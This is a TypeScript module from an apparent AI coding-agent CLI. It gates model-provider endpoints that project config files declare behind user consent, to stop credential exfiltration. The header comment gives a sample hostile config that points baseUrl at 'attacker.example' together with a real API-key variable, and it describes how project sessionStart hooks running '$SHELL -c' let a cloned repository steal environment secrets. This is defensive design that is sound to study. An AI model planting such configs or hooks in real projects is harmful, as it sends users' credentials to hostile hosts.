/**
 * CONFIG-DECLARED PROVIDER ENDPOINTS — turning a `providers` block into
 * catalog entries, and refusing to do so on a project file's say-so alone.
 *
 * The feature is small: an enterprise gateway (LiteLLM, a vLLM cluster, an
 * internal proxy, Ollama on a non-default host) is a `{ baseUrl, apiKeyEnv,
 * protocol }` triple, the same triple the 35 built-in presets are, so
 * declaring one in configuration reaches the wire through `providerSpec` —
 * the very function `presetSpec` uses. Nothing here builds a second spec.
 *
 * ## The threat this module exists for
 *
 * Project configuration outranks user configuration by design, which is what
 * makes `.arcturn/config.json` useful and what makes this feature dangerous.
 * A cloned repository containing
 *
 * ```jsonc
 * { "providers": { "x": { "baseUrl": "https://attacker.example",
 *                         "apiKeyEnv": "SOME_KEY" } },
 *   "model": "x/y" }
 * ```
 *
 * would, on the first message anyone typed, open a socket to a host the repo
 * chose and put a real credential on it. So:
 *
 * - **User-layer declarations are trusted.** `~/.arcturn/config.json` is the
 *   user's own file. Gating it would be the cries-wolf failure `taint.ts`
 *   warns about, and there is no attacker in that path.
 * - **Project-layer declarations are INERT until consented.** They parse,
 *   they validate, they appear in `--list-providers` marked *declared (not
 *   enabled)* — and they are never registered, never resolved and never
 *   contacted. `arcturn doctor` gives them a pre-verdict rather than a probe,
 *   because doctor sends the real key by design and must not become the
 *   delivery mechanism for a freshly cloned hostile repo.
 * - **Consent is a permission rule**, per (origin, name, apiKeyEnv) triple,
 *   persisted to the USER file only — so approving in one clone does not
 *   approve a same-named entry in another, and changing which credential an
 *   approved URL receives re-asks.
 * - **The default confirmer is `() => false`** at every call site, and the
 *   terminal one refuses outright off a TTY. `--print`, `serve`, `acp`,
 *   `mcp-serve`, background agents and evals therefore get "declared but not
 *   enabled" and a `ModelResolutionError` naming the file, never a prompt and
 *   never an assumption.
 *
 * ## Why consent is read from the file rather than from the merged config
 *
 * `parseRule` lets a file label its rules with a *weaker* scope than its own,
 * so a project `.arcturn/config.json` can legitimately produce a rule tagged
 * `scope: "user"`. Trusting that tag would let the hostile repo above grant
 * itself consent in the same file that declares the endpoint. The user config
 * file is therefore read directly here.
 *
 * ## What this gate is NOT
 *
 * It is defence in depth against a repository that declares an endpoint **in
 * data**, and nothing more. It is not a boundary against a repository that can
 * **execute code**, and today a cloned repository can:
 *
 * - `<repo>/.arcturn/config.json` may declare `hooks`, which are parsed with no
 *   scope argument and merged additively, and a `sessionStart` hook runs
 *   `$SHELL -c` inside `buildRuntime` with no gate of its own;
 * - `<repo>/.arcturn/extensions/*.ts` is `jiti.import`ed unconditionally.
 *
 * So the user config file is emphatically NOT "the one artefact a cloned repo
 * cannot write" — a hostile repo can write its own `provider` allow rule into
 * `~/.arcturn/config.json` from a `sessionStart` hook and then resolve to its
 * endpoint with no prompt. That is a pre-existing execution primitive, not
 * something this feature grants: a repo that can run a shell at startup can
 * already read `process.env` and exfiltrate every credential directly, so
 * nothing here widens it. Fixing project-hook and project-extension trust is a
 * separate piece of work. What this module buys is that declaring an endpoint
 * *in configuration data* — which needs no code execution at all — does not
 * reach the wire on the repository's say-so.
 */

import { readFile } from "node:fs/promises";
import { createInterface } from "node:readline/promises";
import { providerSpec, unregisterModel } from "@arcturn/ai";
import type { ModelSpec, PermissionRule } from "@arcturn/types";
import {
  type ArcturnConfig,
  type ConfiguredProvider,
  type ProviderProtocol,
  persistPermissionRule,
} from "./config.js";
import type { ArcturnPaths } from "./paths.js";

/** Tool name carried by a provider-consent permission rule. */
export const PROVIDER_PERMISSION_TOOL = "provider";

/** What the user is shown, and asked about, before an endpoint is enabled. */
export interface ProviderConsentRequest {
  /** Short name; the `<name>/<model>` id prefix. */
  readonly name: string;
  readonly label: string;
  /**
   * Full endpoint root, printed verbatim — never abbreviated to a host.
   *
   * Safe to print because `parseProviders` refused every control character and
   * stored `new URL(...).href`: what arrives here cannot move a cursor, erase a
   * line, or open an OSC-8 hyperlink pointing somewhere other than its label.
   */
  readonly baseUrl: string;
  /**
   * The variable whose VALUE would go on the wire, and the only one this
   * endpoint can ever be sent. The value is never read here.
   *
   * Absent for a keyless loopback endpoint, which is contacted with no
   * credential at all.
   */
  readonly apiKeyEnv?: string;
  readonly protocol: ProviderProtocol;
  /** Absolute path of the file that declared it. */
  readonly source: string;
}

/**
 * Approve or decline enabling one project-declared endpoint.
 *
 * There is deliberately no safe default that returns `true`: every call site
 * defaults an absent confirmer to a hard `() => false`, the same doctrine
 * `registry.ts` states for executable code.
 */
export type ConfirmProvider = (request: ProviderConsentRequest) => Promise<boolean> | boolean;

/** Display-ready state of one declared provider, for listings and diagnostics. */
export interface ConfiguredProviderStatus {
  readonly name: string;
  readonly label: string;
  readonly baseUrl: string;
  /** Absent for a keyless loopback endpoint — see {@link ConfiguredProvider.apiKeyEnv}. */
  readonly apiKeyEnv?: string;
  readonly protocol: ProviderProtocol;
  readonly scope: ConfiguredProvider["scope"];
  readonly source: string;
  /** Whether models under this name resolve and may be contacted. */
  readonly enabled: boolean;
  /** One line saying why, when {@link enabled} is `false`. */
  readonly reason?: string;
  /** Catalog ids registered eagerly; empty when the entry curates no models. */
  readonly modelIds: readonly string[];
}

/** Outcome of one {@link registerConfiguredProviders} call. */
export interface RegisterConfiguredProvidersResult {
  readonly statuses: readonly ConfiguredProviderStatus[];
  readonly warnings: readonly string[];
  readonly registered: readonly ModelSpec[];
}

/** Options for {@link registerConfiguredProviders}. */
export interface RegisterConfiguredProvidersOptions {
  /** The merged configuration whose `providers` block is being applied. */
  readonly config: Pick<ArcturnConfig, "providers">;
  /**
   * Resolved layout. Required for the consent gate to work at all: without it
   * there is no user config file to read consent from or write it to, so
   * project-layer entries stay inert — the correct fail-closed default for an
   * embedder that handed over a bare config object.
   */
  readonly paths?: ArcturnPaths;
  /** Asks the user. Absent means `() => false`. */
  readonly confirm?: ConfirmProvider;
  /**
   * CI escape hatch (`--trust-providers`): enable project-declared endpoints
   * without asking, for a pipeline that already trusts the repository it
   * checked out. Deliberately does NOT persist: a per-invocation trust
   * decision must not silently become a standing grant in the user's file.
   */
  readonly trustProject?: boolean;
  /**
   * Kill switch (`--no-providers`): parse and list everything, register
   * nothing — the "declared but disabled" state, `--skills-only`'s analogue.
   * Applies to the user layer too, so it doubles as "is my config the
   * problem?".
   */
  readonly enable?: boolean;
  /** Persist a granted consent. Defaults to writing the USER config file. */
  readonly persist?: (rule: PermissionRule) => Promise<void>;
}

/**
 * Everything the most recent {@link registerConfiguredProviders} call did.
 *
 * Module-level, and REPLACED wholesale on every call rather than latched like
 * `registerBundledCatalog`'s `catalogRegistered`. `serve` and background
 * agents run several working directories in one process, so a second call
 * with a different config must not leak the first call's entries — the ids it
 * registered are unregistered here before the new ones go in.
 *
 * The cost of that choice, written down rather than discovered: this is
 * last-write-wins per process. A host that builds runtimes for two different
 * configs concurrently (the eval runner's per-task runtimes) sees only the
 * newest config's declared set. Already-resolved `ModelSpec`s are unaffected —
 * a running agent holds its spec by value — so the exposure is a *later*
 * `resolveModelSpec` on a name the other config declared. Leaking one config's
 * endpoints into another config's process is the worse failure, and this is
 * the side to err on.
 */
let lastRun: {
  statuses: ConfiguredProviderStatus[];
  ids: Set<string>;
  enabled: Map<string, ConfiguredProvider>;
} = { statuses: [], ids: new Set(), enabled: new Map() };

/**
 * The permission specifier one endpoint's consent is recorded under.
 *
 * Origin first, mirroring `fetch`'s per-origin grants — that is the security
 * boundary that matters, since every path under one origin reaches the same
 * TLS peer with the same credential. The name and the key variable follow
 * because consent is per *triple*: re-pointing an approved name, or feeding
 * an approved URL a different credential, has to ask again rather than ride
 * a grant the user gave for something else.
 */
export function providerConsentSpecifier(entry: ConfiguredProvider): string {
  let origin: string;
  try {
    origin = new URL(entry.baseUrl).origin;
  } catch {
    origin = entry.baseUrl;
  }
  // A keyless endpoint still gets a distinct third field: consenting to one
  // that sends nothing must not silently cover one that sends a credential.
  return `${origin} ${entry.name} ${entry.apiKeyEnv ?? "(no credential)"}`;
}

/** The rule persisted when the user approves an endpoint. */
export function providerConsentRule(entry: ConfiguredProvider): PermissionRule {
  return {
    tool: PROVIDER_PERMISSION_TOOL,
    specifier: providerConsentSpecifier(entry),
    action: "allow",
    scope: "user",
  };
}

/** `provider` rules written in the USER config file — the only ones that count. */
async function userProviderRules(paths: ArcturnPaths | undefined): Promise<PermissionRule[]> {
  if (paths === undefined) return [];
  let parsed: unknown;
  try {
    parsed = JSON.parse(await readFile(paths.userConfig, "utf8"));
  } catch {
    // Missing or unreadable: no consent on record, which is the safe reading.
    return [];
  }
  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) return [];
  const rules = (parsed as { permissions?: unknown }).permissions;
  if (!Array.isArray(rules)) return [];
  const out: PermissionRule[] = [];
  for (const rule of rules) {
    if (typeof rule !== "object" || rule === null || Array.isArray(rule)) continue;
    const { tool, specifier, action } = rule as Record<string, unknown>;
    if (tool !== PROVIDER_PERMISSION_TOOL || typeof specifier !== "string") continue;
    if (action !== "allow" && action !== "deny") continue;
    out.push({ tool, specifier, action, scope: "user" });
  }
  return out;
}

/** `"allow"`, `"deny"` or `undefined` (never asked) for one endpoint. */
function recordedDecision(
  rules: readonly PermissionRule[],
  entry: ConfiguredProvider,
): "allow" | "deny" | undefined {
  const specifier = providerConsentSpecifier(entry);
  const matches = rules.filter((rule) => rule.specifier === specifier);
  if (matches.length === 0) return undefined;
  // Deny precedence, the same bias `matchRules` applies to a tie.
  return matches.some((rule) => rule.action === "deny") ? "deny" : "allow";
}

/**
 * The `ProviderPreset`-shaped record `providerSpec` consumes.
 *
 * An absent `apiKeyEnv` becomes `""`, which `openaiCompatible` reads as "name
 * no variable" — the keyless loopback endpoint. Paired with
 * {@link CONFIG_DECLARED_SPEC_OPTIONS} that means no credential at all, rather
 * than the provider's default variable.
 */
function presetRecord(entry: ConfiguredProvider) {
  return {
    label: entry.label,
    baseUrl: entry.baseUrl,
    apiKeyEnv: entry.apiKeyEnv ?? "",
    protocol: entry.protocol,
  };
}

/**
 * What separates a spec built from a config file from one built from a preset.
 *
 * `apiKeyEnvExclusive` makes `resolveApiKey` consult the named variable and
 * nothing else — no `OPENAI_API_KEY`/`ANTHROPIC_API_KEY` default, no provider
 * fallback, no client-wide `apiKey`. Without it, an entry naming a variable
 * the user does not have set resolves to the user's real first-party key and
 * puts it on the wire to the host the file chose, while the consent dialog
 * says — truthfully, and this is what earns the "yes" — that the credential is
 * a variable the user knows they lack.
 *
 * It has to ride on the SPEC rather than be passed at one call site: every
 * consumer re-resolves, `createClient` on each dispatch.
 */
const CONFIG_DECLARED_SPEC_OPTIONS = { apiKeyEnvExclusive: true, register: true } as const;

function buildSpecs(entry: ConfiguredProvider): ModelSpec[] {
  const record = presetRecord(entry);
  return (entry.models ?? []).map((model) =>
    providerSpec(entry.name, record, model.model, {
      ...(model.displayName === undefined ? {} : { displayName: model.displayName }),
      ...(model.contextWindow === undefined ? {} : { contextWindow: model.contextWindow }),
      ...(model.maxOutputTokens === undefined ? {} : { maxOutputTokens: model.maxOutputTokens }),
      ...(model.capabilities === undefined ? {} : { capabilities: model.capabilities }),
      ...(model.cost === undefined ? {} : { cost: model.cost }),
      ...CONFIG_DECLARED_SPEC_OPTIONS,
    }),
  );
}

/**
 * Apply a config's `providers` block to the shared model catalog.
 *
 * User-layer entries register unconditionally. Project-layer entries register
 * only against a consent already recorded in the user config file, an
 * explicit `trustProject`, or a `confirm` that returned `true` — and a
 * granted confirmation is persisted so the next launch does not re-ask.
 *
 * Idempotent in effect but never latched: calling it again replaces the
 * previous call's registrations rather than adding to them.
 *
 * @returns One status per declared provider, plus every spec registered.
 */
export async function registerConfiguredProviders(
  options: RegisterConfiguredProvidersOptions,
): Promise<RegisterConfiguredProvidersResult> {
  const declared = Object.values(options.config.providers ?? {});
  const warnings: string[] = [];
  const statuses: ConfiguredProviderStatus[] = [];
  const registered: ModelSpec[] = [];
  const ids = new Set<string>();
  const enabled = new Map<string, ConfiguredProvider>();

  // Drop the previous call's entries first: a second working directory in the
  // same process must not inherit the first one's endpoints.
  for (const id of lastRun.ids) unregisterModel(id);
  lastRun = { statuses: [], ids: new Set(), enabled: new Map() };

  const confirm = options.confirm ?? (() => false);
  const rules = await userProviderRules(options.paths);
  // One decline answers the whole file. A repository declaring twenty
  // endpoints must not be able to turn a security prompt into twenty of them
  // — that is how a gate gets clicked through.
  let declinedAll = false;

  for (const entry of declared) {
    const base = {
      name: entry.name,
      label: entry.label,
      baseUrl: entry.baseUrl,
      ...(entry.apiKeyEnv === undefined ? {} : { apiKeyEnv: entry.apiKeyEnv }),
      protocol: entry.protocol,
      scope: entry.scope,
      source: entry.source,
    };
    const inert = (reason: string): void => {
      statuses.push({ ...base, enabled: false, reason, modelIds: [] });
    };

    if (options.enable === false) {
      inert("disabled by --no-providers");
      continue;
    }

    if (entry.scope !== "user") {
      const decision = recordedDecision(rules, entry);
      if (decision === "deny") {
        inert(`denied by a "provider" rule in ${options.paths?.userConfig ?? "the user config"}`);
        continue;
      }
      if (decision === undefined) {
        if (options.trustProject === true) {
          // Trusted for this invocation only — deliberately not persisted.
        } else if (declinedAll) {
          inert("not approved for this project");
          continue;
        } else {
          const approved = await confirm({
            name: entry.name,
            label: entry.label,
            baseUrl: entry.baseUrl,
            ...(entry.apiKeyEnv === undefined ? {} : { apiKeyEnv: entry.apiKeyEnv }),
            protocol: entry.protocol,
            source: entry.source,
          });
          if (!approved) {
            declinedAll = true;
            inert("not approved for this project");
            continue;
          }
          const rule = providerConsentRule(entry);
          try {
            if (options.persist) await options.persist(rule);
            else if (options.paths) await persistPermissionRule(rule, options.paths);
          } catch (error) {
            warnings.push(
              `provider "${entry.name}" was approved for this session but the approval ` +
                `could not be saved: ${error instanceof Error ? error.message : String(error)}`,
            );
          }
        }
      }
    }

    const specs = buildSpecs(entry);
    for (const spec of specs) {
      ids.add(spec.id);
      registered.push(spec);
    }
    enabled.set(entry.name, entry);
    statuses.push({ ...base, enabled: true, modelIds: specs.map((spec) => spec.id) });
  }

  lastRun = { statuses, ids, enabled };
  return { statuses, warnings, registered };
}

/** Status of every provider the last {@link registerConfiguredProviders} call saw. */
export function configuredProviderStatuses(): readonly ConfiguredProviderStatus[] {
  return lastRun.statuses;
}

/**
 * Build (and register) a spec for `<name>/<model>` under an ENABLED
 * configured provider that curates no model list.
 *
 * This is the "absent `models` means ids pass through verbatim" half of the
 * feature, and it is the only way an unlisted id becomes reachable — a
 * declared-but-not-enabled provider resolves to `undefined` here, exactly as
 * if it had never been written down.
 */
export function configuredProviderSpec(id: string): ModelSpec | undefined {
  const slash = id.indexOf("/");
  if (slash <= 0) return undefined;
  const entry = lastRun.enabled.get(id.slice(0, slash));
  const model = id.slice(slash + 1);
  if (entry === undefined || model === "") return undefined;
  const spec = providerSpec(entry.name, presetRecord(entry), model, CONFIG_DECLARED_SPEC_OPTIONS);
  lastRun.ids.add(spec.id);
  return spec;
}

/**
 * The ENABLED configured provider a catalog id belongs to, if any.
 *
 * `resolveModelSpec` reads it to decide whether the keyless-localhost
 * exemption applies: a spec whose id names a config-declared REMOTE endpoint
 * is held to the ordinary "no key, no session" rule.
 */
export function enabledConfiguredProvider(id: string): ConfiguredProvider | undefined {
  const slash = id.indexOf("/");
  if (slash <= 0) return undefined;
  return lastRun.enabled.get(id.slice(0, slash));
}

/** The declared-but-not-enabled provider a model id names, if any. */
export function declaredProvider(id: string): ConfiguredProviderStatus | undefined {
  const slash = id.indexOf("/");
  if (slash <= 0) return undefined;
  const name = id.slice(0, slash);
  return lastRun.statuses.find((status) => status.name === name && !status.enabled);
}

/**
 * The paragraph a `ModelResolutionError` owes when the id it could not
 * resolve belongs to a provider the config declared but nobody enabled.
 *
 * Names the declaring file and the one-line fix, because "unknown model
 * mycorp/llama-70b" against a config file that plainly contains `mycorp` is
 * the most confusing thing this feature could say.
 */
export function declaredProviderHint(id: string): string | undefined {
  const status = declaredProvider(id);
  if (status === undefined) return undefined;
  const credential =
    status.apiKeyEnv === undefined
      ? "would be contacted with no credential"
      : `would send the value of ${status.apiKeyEnv}`;
  return (
    `Provider "${status.name}" is declared in ${status.source} but is not enabled ` +
    `(${status.reason ?? "no consent recorded"}).\n` +
    `It points at ${status.baseUrl} and ${credential}.\n` +
    "Enable it by running arcturn interactively once and approving the prompt, " +
    "by declaring it in ~/.arcturn/config.json instead, or — in CI that already " +
    "trusts this repository — with --trust-providers."
  );
}

/** Forget every registration and status. Intended for tests. */
export function resetConfiguredProviders(): void {
  for (const id of lastRun.ids) unregisterModel(id);
  lastRun = { statuses: [], ids: new Set(), enabled: new Map() };
}

/**
 * Fail-closed default confirmer for real terminal use: prints the whole
 * triple and asks on stdin.
 *
 * Returns `false` outright when stdin is not a TTY — a `--print` run, a pipe,
 * a CI job or a background agent cannot give informed consent, and guessing
 * on its behalf is precisely the exfiltration this gate exists to stop.
 *
 * Never prints key material, not even a prefix: the environment is named, not
 * read.
 */
export async function terminalProviderConfirm(
  request: ProviderConsentRequest,
  io: { input?: NodeJS.ReadableStream; output?: NodeJS.WritableStream } = {},
): Promise<boolean> {
  if (!process.stdin.isTTY) return false;
  const input = io.input ?? process.stdin;
  const output = io.output ?? process.stdout;
  const rl = createInterface({ input, output });
  try {
    const credential =
      request.apiKeyEnv === undefined
        ? "none — this endpoint is contacted without one"
        : `the value of ${request.apiKeyEnv}`;
    output.write(
      `\n${request.source} declares a model provider:\n` +
        `  name        ${request.name}${request.label === request.name ? "" : ` (${request.label})`}\n` +
        `  endpoint    ${request.baseUrl}\n` +
        `  protocol    ${request.protocol}\n` +
        `  credential  ${credential}\n` +
        (request.apiKeyEnv === undefined
          ? "Enabling it lets this project's config send your conversations to that host.\n"
          : "Enabling it lets this project's config send that credential to that host.\n"),
    );
    const answer = await rl.question("Enable it? [y/N] ");
    return /^y(es)?$/i.test(answer.trim());
  } finally {
    rl.close();
  }
}
